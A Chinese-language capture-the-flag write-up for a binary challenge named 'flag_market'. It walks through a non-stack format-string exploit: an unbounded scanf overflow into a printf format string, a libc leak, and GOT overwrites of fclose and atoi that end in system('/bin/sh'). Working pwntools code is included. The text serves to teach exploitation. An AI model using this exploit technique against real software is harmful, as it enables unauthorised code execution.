## flag\_market


# 非栈上格式化字符串

利用plt指针的特性造一个指针跳板出来


### 逆向分析

源码如下：


```python
// 主函数 - 实现flag市场程序逻辑
// 程序流程：
// 1. 初始化标准IO缓冲区
// 2. 打开flag文件
// 3. 显示菜单并处理用户输入
// 4. 根据用户支付金额决定是否显示flag
// 5. 处理错误情况并记录日志
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int i; // [rsp+Ch] [rbp-84h]
  int fd; // [rsp+14h] [rbp-7Ch]
  FILE *stream; // [rsp+18h] [rbp-78h]
  char filename[9]; // [rsp+27h] [rbp-69h] BYREF
  char s[16]; // [rsp+30h] [rbp-60h] BYREF
  char v9[72]; // [rsp+40h] [rbp-50h] BYREF
  unsigned __int64 v10; // [rsp+88h] [rbp-8h]
  v10 = __readfsqword(0x28u);
  init_stdio_buffers(a1, a2, a3);
  strcpy(filename, "/flag");                    // 设置flag文件路径为 /flag
  stream = fopen(filename, "r");
  flag_file_opened = 1;
  while ( 1 )
  {
    while ( 1 )
    {
      puts("welcome to flag market!\ngive me money to buy my flag,\nchoice: \n1.take my money\n2.exit");
      memset(s, 0, sizeof(s));
      read(0, s, 0x10uLL);
      if ( (unsigned __int8)atoi(s) != 1 )
        exit(0);
      puts("how much you want to pay?");
      memset(s, 0, sizeof(s));
      read(0, s, 0x10uLL);
      if ( (unsigned __int8)atoi(s) == 0xFF )
        break;                                  // 检查用户支付金额是否为255(0xFF) - 只有支付255才能获得flag
      printf("You are so parsimonious!!!");
      if ( flag_file_opened )
      {
        fclose(stream);
        flag_file_opened = 0;
      }
    }
    puts(aThankYouForPay);
    if ( !flag_file_opened || !fgets(v9, 64, stream) )
      break;
    for ( i = 0; ; ++i )
    {
      if ( i > 64 )
      {
        puts("\nThank you for your patronage!");
        return 0LL;
      }
      if ( v9[i] == 123 )
        break;                                  // 检查flag字符是否为'{' - 遇到'{'时停止显示，可能是flag格式的开始
      putchar(v9[i]);
      sleep(1u);
    }
    memset(v9, 0, 0x40uLL);
    puts(a1m31mError0mSo);
    puts("opened user.log, please report:");
    memset(user_log_open_flags, 0, 0x100uLL);   // 清空用户日志打开标志缓冲区
    __isoc99_scanf("%s", user_log_open_flags);  // 读取用户输入的日志文件打开标志 - 存在缓冲区溢出风险
    getchar();
    fd = open("user.log", (int)user_log_open_flags);// 打开user.log文件 - 使用用户提供的oflag参数，可能存在安全风险
    write(fd, user_log_open_flags, 0x100uLL);   // 将用户输入的标志写入日志文件 - 可能写入过多数据
    puts(aOkNowYouCanExi);
  }
  puts("something is wrong");
  return 0LL;
}
```

简单实现了读入flag文件、处理错误情况并写入日志
其中


```
    __isoc99_scanf("%s", user_log_open_flags);  // 读取用户输入的日志文件打开标志 - 存在缓冲区溢出风险
    getchar();
```

这里`%s`输入内容到bss段，没有做长度限制，存在溢出漏洞，可以看下附近有什么


```asm
.data:00000000004040C0 user_log_open_flags db 'everything is ok~',0
.data:00000000004040C0                                         ; DATA XREF: main+245↑o
.data:00000000004040C0                                         ; main+254↑o ...
.data:00000000004040D2                 db    0
...
.data:00000000004041C0 ; char format[]
.data:00000000004041C0 format          db 'You are so parsimonious!!!',0
.data:00000000004041C0                                         ; DATA XREF: main+112↑o
.data:00000000004041DB                 align 20h
.data:00000000004041E0 ; char aThankYouForPay[]
.data:00000000004041E0 aThankYouForPay db 'Thank you for paying,let me give you flag: ',0
.data:00000000004041E0                                         ; DATA XREF: main:loc_4014EA↑o
```

可以注意到可以修改别的字符串内容，然后看下这个字符串干嘛


```
      read(0, s, 0x10uLL);
      if ( (unsigned __int8)atoi(s) == 0xFF )
        break;                                  // 检查用户支付金额是否为255(0xFF) - 只有支付255才能获得flag
      printf("You are so parsimonious!!!");
      if ( flag_file_opened )
      {
        fclose(stream);
        flag_file_opened = 0
```

用printf打印的，可以构造非栈上的格式化字符串，操作流程如下


### 泄露libc\_base


```
p.recvuntil(b'1.take my money\n2.exit\n')
p.sendline(b'1')
p.sendline(b'-1')
p.recvuntil(b'opened user.log, please report:\n')
main = 0x40139B
payload = b'a'*0x100+b'%25$p'+'%{}c'.format(main-0xe).encode()+b'%12$n'
p.sendline(payload)
p.recvuntil(b'1.take my money\n2.exit\n')
p.sendline(b'1')
p.sendline(p64(elf.got['fclose']))
p.recvuntil(b'0x')
libc_base = int(p.recv(12),16)-0x2a1ca
log.success("libc_base:"+hex(libc_base))
```

![Pasted image 20251020235109.png](../../images/Pasted%20image%2020251020235109.png)
调用这个printf的时候的栈空间如图
先$6+19=25$ 得到一个libc地址，有`0xe`字节
然后我们可以修改`fclose`的地址为`main`的地址，这样可以多次输入，避免因为如下代码结束，也可以认为是我们造了一个指针跳板


```
     printf("You are so parsimonious!!!");
      if ( flag_file_opened )
      {
        fclose(stream);
        flag_file_opened = 0;
      }
    }
```

可以看到输入位置为$6+6=12$偏移处
然后我们在下次输入的时候可以输入`fclose`的地址，如下
![Pasted image 20251021001702.png](../../images/Pasted%20image%2020251021001702.png)
![Pasted image 20251021001710.png](../../images/Pasted%20image%2020251021001710.png)
实现修改了，同时libc刚才的布局就泄露出来了
接下来就是一个非栈上的格式化字符串，打跳板了


```
p.recvuntil(b'exit\n')
p.sendline(b'1')
p.recvuntil(b'pay?\n')
p.sendline(b'-1')

system = libc_base+libc.sym['system']
val1 = system & 0xffff
val2 = ((system >> 16) & 0xffff) - val1 + 0x10000
payload = b'\x00'*0x100
payload += '%{}c'.format(val1).encode() + b'%12$hn'
payload += '%{}c'.format(val2).encode() + b'%13$hn'
p.recvuntil(b'report:\n')
p.sendline(payload)
p.recvuntil(b'exit\n')
p.sendline(b'1')
p.recvuntil(b'pay?\n')
p.send(p64(elf.got['atoi']) + p64(elf.got['atoi'] + 2))

p.recvuntil(b'exit\n')
p.sendline(b'/bin/sh\x00')
```

将system准备好，然后再次写入地址位置，借助`atoi`函数实现`system(/bin/sh)`


## bhp
